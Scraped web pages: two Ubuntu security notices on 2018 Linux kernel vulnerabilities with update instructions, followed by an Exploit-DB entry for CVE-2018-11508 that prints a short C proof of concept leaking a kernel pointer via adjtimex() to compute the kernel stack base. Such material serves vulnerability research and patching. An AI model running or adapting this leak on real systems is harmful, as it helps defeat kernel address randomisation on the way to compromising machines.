=== Content from usn.ubuntu.com_965d57cb_20250125_093051.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-3695-1: Linux kernel vulnerabilities

2 July 2018

Several security issues were fixed in the Linux kernel.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 18.04 ESM](/security/notices?release=bionic)

## Packages

* [linux](/security/cves?package=linux) - Linux kernel
* [linux-aws](/security/cves?package=linux-aws) - Linux kernel for Amazon Web Services (AWS) systems
* [linux-azure](/security/cves?package=linux-azure) - Linux kernel for Microsoft Azure Cloud systems
* [linux-gcp](/security/cves?package=linux-gcp) - Linux kernel for Google Cloud Platform (GCP) systems
* [linux-kvm](/security/cves?package=linux-kvm) - Linux kernel for cloud environments
* [linux-oem](/security/cves?package=linux-oem) - Linux kernel for OEM processors
* [linux-raspi2](/security/cves?package=linux-raspi2) - Linux kernel for Raspberry Pi 2

## Details

Wen Xu discovered that the ext4 filesystem implementation in the Linux

kernel did not properly initialize the crc32c checksum driver. A local

attacker could use this to cause a denial of service (system crash).

([CVE-2018-1094](/security/CVE-2018-1094))

It was discovered that the cdrom driver in the Linux kernel contained an

incorrect bounds check. A local attacker could use this to expose sensitive

information (kernel memory). ([CVE-2018-10940](/security/CVE-2018-10940))

Wen Xu discovered that the ext4 file system implementation in the Linux

kernel did not properly validate xattr sizes. A local attacker could use

this to cause a denial of service (system crash). ([CVE-2018-1095](/security/CVE-2018-1095))

Jann Horn discovered that the 32 bit adjtimex() syscall implementation for

64 bit Linux kernels did not properly initialize memory returned to user

space in some situations. A local attacker could use this to expose

sensitive information (kernel memory). ([CVE-2018-11508](/security/CVE-2018-11508))

It was discovered that an information leak vulnerability existed in the

floppy driver in the Linux kernel. A local attacker could use this to

expose sensitive information (kernel memory). ([CVE-2018-7755](/security/CVE-2018-7755))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 18.04

* [linux-image-4.15.0-1010-gcp](https://launchpad.net/ubuntu/%2Bsource/linux-gcp)
  -
  [4.15.0-1010.10](https://launchpad.net/ubuntu/%2Bsource/linux-gcp/4.15.0-1010.10)
* [linux-image-4.15.0-1011-aws](https://launchpad.net/ubuntu/%2Bsource/linux-aws)
  -
  [4.15.0-1011.11](https://launchpad.net/ubuntu/%2Bsource/linux-aws/4.15.0-1011.11)
* [linux-image-4.15.0-1012-kvm](https://launchpad.net/ubuntu/%2Bsource/linux-kvm)
  -
  [4.15.0-1012.12](https://launchpad.net/ubuntu/%2Bsource/linux-kvm/4.15.0-1012.12)
* [linux-image-4.15.0-1013-raspi2](https://launchpad.net/ubuntu/%2Bsource/linux-raspi2)
  -
  [4.15.0-1013.14](https://launchpad.net/ubuntu/%2Bsource/linux-raspi2/4.15.0-1013.14)
* [linux-image-4.15.0-24-generic](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [4.15.0-24.26](https://launchpad.net/ubuntu/%2Bsource/linux/4.15.0-24.26)
* [linux-image-4.15.0-24-generic-lpae](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [4.15.0-24.26](https://launchpad.net/ubuntu/%2Bsource/linux/4.15.0-24.26)
* [linux-image-4.15.0-24-lowlatency](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [4.15.0-24.26](https://launchpad.net/ubuntu/%2Bsource/linux/4.15.0-24.26)
* [linux-image-4.15.0-24-snapdragon](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [4.15.0-24.26](https://launchpad.net/ubuntu/%2Bsource/linux/4.15.0-24.26)

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed.

Unless you manually uninstalled the standard kernel metapackages

(e.g. linux-generic, linux-generic-lts-RELEASE, linux-virtual,

linux-powerpc), a standard system upgrade will automatically perform

this as well.

## References

* [CVE-2018-1094](/security/CVE-2018-1094)
* [CVE-2018-10940](/security/CVE-2018-10940)
* [CVE-2018-1095](/security/CVE-2018-1095)
* [CVE-2018-11508](/security/CVE-2018-11508)
* [CVE-2018-7755](/security/CVE-2018-7755)

## Related notices

* [USN-3695-2](/security/notices/USN-3695-2)
* [USN-3676-1](/security/notices/USN-3676-1)
* [USN-3676-2](/security/notices/USN-3676-2)
* [USN-3754-1](/security/notices/USN-3754-1)
* [USN-3697-1](/security/notices/USN-3697-1)
* [USN-3697-2](/security/notices/USN-3697-2)
* [USN-3698-2](/security/notices/USN-3698-2)
* [USN-3698-1](/security/notices/USN-3698-1)
* [USN-3696-2](/security/notices/USN-3696-2)
* [USN-3696-1](/security/notices/USN-3696-1)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from usn.ubuntu.com_1a0e5017_20250125_093053.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-3697-1: Linux kernel vulnerabilities

2 July 2018

Several security issues were fixed in the Linux kernel.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 17.10](/security/notices?release=artful)

## Packages

* [linux](/security/cves?package=linux) - Linux kernel
* [linux-raspi2](/security/cves?package=linux-raspi2) - Linux kernel for Raspberry Pi 2

## Details

It was discovered that a null pointer dereference vulnerability existed in

the DCCP protocol implementation in the Linux kernel. A local attacker

could use this to cause a denial of service (system crash). ([CVE-2018-1130](/security/CVE-2018-1130))

Jann Horn discovered that the 32 bit adjtimex() syscall implementation for

64 bit Linux kernels did not properly initialize memory returned to user

space in some situations. A local attacker could use this to expose

sensitive information (kernel memory). ([CVE-2018-11508](/security/CVE-2018-11508))

Wang Qize discovered that an information disclosure vulnerability existed

in the SMBus driver for ACPI Embedded Controllers in the Linux kernel. A

local attacker could use this to expose sensitive information (kernel

pointer addresses). ([CVE-2018-5750](/security/CVE-2018-5750))

It was discovered that the SCTP Protocol implementation in the Linux kernel

did not properly validate userspace provided payload lengths in some

situations. A local attacker could use this to cause a denial of service

(system crash). ([CVE-2018-5803](/security/CVE-2018-5803))

It was discovered that an integer overflow error existed in the futex

implementation in the Linux kernel. A local attacker could use this to

cause a denial of service (system crash). ([CVE-2018-6927](/security/CVE-2018-6927))

It was discovered that an information leak vulnerability existed in the

floppy driver in the Linux kernel. A local attacker could use this to

expose sensitive information (kernel memory). ([CVE-2018-7755](/security/CVE-2018-7755))

It was discovered that a memory leak existed in the SAS driver subsystem of

the Linux kernel. A local attacker could use this to cause a denial of

service (memory exhaustion). ([CVE-2018-7757](/security/CVE-2018-7757))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 17.10

* linux-image-generic
  -
  4.13.0.46.49
* linux-image-generic-lpae
  -
  4.13.0.46.49
* [linux-image-4.13.0-1023-raspi2](https://launchpad.net/ubuntu/%2Bsource/linux-raspi2)
  -
  [4.13.0-1023.24](https://launchpad.net/ubuntu/%2Bsource/linux-raspi2/4.13.0-1023.24)
* [linux-image-4.13.0-46-generic](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [4.13.0-46.51](https://launchpad.net/ubuntu/%2Bsource/linux/4.13.0-46.51)
* [linux-image-4.13.0-46-generic-lpae](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [4.13.0-46.51](https://launchpad.net/ubuntu/%2Bsource/linux/4.13.0-46.51)
* linux-image-lowlatency
  -
  4.13.0.46.49
* linux-image-raspi2
  -
  4.13.0.1023.21
* [linux-image-4.13.0-46-lowlatency](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [4.13.0-46.51](https://launchpad.net/ubuntu/%2Bsource/linux/4.13.0-46.51)

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed.

Unless you manually uninstalled the standard kernel metapackages

(e.g. linux-generic, linux-generic-lts-RELEASE, linux-virtual,

linux-powerpc), a standard system upgrade will automatically perform

this as well.

## References

* [CVE-2018-1130](/security/CVE-2018-1130)
* [CVE-2018-11508](/security/CVE-2018-11508)
* [CVE-2018-5750](/security/CVE-2018-5750)
* [CVE-2018-5803](/security/CVE-2018-5803)
* [CVE-2018-6927](/security/CVE-2018-6927)
* [CVE-2018-7755](/security/CVE-2018-7755)
* [CVE-2018-7757](/security/CVE-2018-7757)

## Related notices

* [USN-3654-2](/security/notices/USN-3654-2)
* [USN-3698-2](/security/notices/USN-3698-2)
* [USN-3654-1](/security/notices/USN-3654-1)
* [USN-3656-1](/security/notices/USN-3656-1)
* [USN-3698-1](/security/notices/USN-3698-1)
* [USN-3697-2](/security/notices/USN-3697-2)
* [USN-3695-2](/security/notices/USN-3695-2)
* [USN-3695-1](/security/notices/USN-3695-1)
* [USN-3631-2](/security/notices/USN-3631-2)
* [USN-3631-1](/security/notices/USN-3631-1)
* [USN-3619-2](/security/notices/USN-3619-2)
* [USN-3619-1](/security/notices/USN-3619-1)
* [USN-3696-2](/security/notices/USN-3696-2)
* [USN-3696-1](/security/notices/USN-3696-1)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from www.exploit-db.com_8241027e_20250125_093054.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Linux Kernel 4.13 - 'compat\_get\_timex()' Leak Kernel Pointer

#### EDB-ID:

###### 46208

#### CVE:

###### [2018-11508](https://nvd.nist.gov/vuln/detail/CVE-2018-11508)

---

**EDB Verified:**

#### Author:

###### [wally0813](/?author=9847)

#### Type:

###### [dos](/?type=dos)

---

#### Platform:

###### [Linux](/?platform=linux)

#### Date:

###### 2019-01-21

---

**Vulnerable App:**

```
#define _GNU_SOURCE
#define _BSD_SOURCE
#include <sys/timex.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <kptr-lib.h>

// Ubuntu 4.13.0-16-generic
// gcc -o poc poc.c -m32

struct timex time;

int main(int argc, char **argv)
{
	int r;
	unsigned long long stack_offset, kernel_base;
	unsigned int leak_value;
	unsigned int high = 0xffffffff;

	memset(&time, 0, sizeof(time));
	time.modes = 0x8000;

	mmap(0,0xa000,3,2022,-1,0);

	adjtimex(&time);
	leak_value = time.tai;
	printf("--> leak_value : %x\n", leak_value);

	memcpy(&kernel_base, &leak_value, 4);
	memcpy((char *)&kernel_base + 4, &high, 4);
	stack_offset = 0x1fc4a4;
	kernel_base = leak_value - stack_offset;
	printf("--> kernel_stack_base : %llx\n", kernel_base);

 	return 0;
}

```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500
